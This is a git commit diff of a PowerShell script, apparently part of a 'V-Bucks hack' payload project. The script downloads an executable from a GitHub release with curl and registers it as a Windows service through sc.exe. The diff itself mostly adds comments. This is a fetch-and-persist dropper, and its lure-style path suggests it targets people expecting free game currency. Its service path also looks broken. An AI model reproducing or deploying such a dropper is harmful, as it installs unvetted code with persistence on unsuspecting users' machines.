492f032d265664038707c79dc607571a647a2cf7
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-29 20:30:52 -0400

    Backup.

--- payload/vbucks/src/hack/ps/installcryptpy.ps1
+++ payload/vbucks/src/hack/ps/installcryptpy.ps1
@@ -1,10 +1,10 @@
-$version = $args[0]
+$version = $args[0] # Fetch version argument
 
-$downloadUrl = 'https://github.com/mitsukomegumi/CryptPy.js/releases/download/'+$version+'/cryptpy-win.exe'
-$downloadCommand = 'curl '+$downloadUrl+' --output cryptpy-win.exe'
-$downloadPath = (Get-Item -Path ".\").FullName
+$downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-win.exe" # Fetch latest build URL
+$downloadCommand = 'curl -L '+$downloadUrl+' --output cryptpy-win.exe' # Set into command
+$downloadPath = (Get-Item -Path ".\").FullName # Get current path for future reference
 
-$serviceGenCommand = 'sc.exe create cryptpy binPath= "'+$downloadPath+'"'
+$serviceGenCommand = 'sc.exe create cryptpy binPath= "'+$downloadPath+'"' # Set create service command
 
-"$downloadCommand" | cmd
-"$serviceGenCommand" | cmd
+"$downloadCommand" | cmd # Download latest build
+"$serviceGenCommand" | cmd # Create service from build
